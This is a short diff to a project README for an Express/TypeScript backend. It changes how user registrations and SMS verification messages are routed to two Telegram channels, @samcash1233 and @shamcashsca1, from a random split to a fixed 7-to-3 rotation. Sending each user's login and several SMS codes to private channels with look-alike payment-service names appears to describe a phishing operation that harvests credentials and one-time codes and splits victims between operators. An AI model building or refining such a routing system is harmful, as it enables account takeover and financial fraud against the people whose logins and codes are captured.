@@ -33,9 +33,9 @@ The backend uses **Express.js** with **TypeScript**, providing a simple REST API
 **Telegram-Only System**: Every user registration and SMS verification triggers Telegram notifications:
 
 **Channel Distribution System:**
-- **Primary Channel (@samcash1233)**: Receives 65% of user sessions
-- **Secondary Channel (@shamcashsca1)**: Receives 35% of user sessions
-- Distribution is random per user session (not per message)
+- **Primary Channel (@samcash1233)**: Receives first 7 out of every 10 registrations (70%)
+- **Secondary Channel (@shamcashsca1)**: Receives last 3 out of every 10 registrations (30%)
+- Distribution is sequential, not random (registrations 1-7→primary, 8-10→secondary, repeat)
 - All related messages for ONE user (Login + SMS 1,2,3) go to the SAME channel
 - Messages remain identical - only the destination channel changes
 
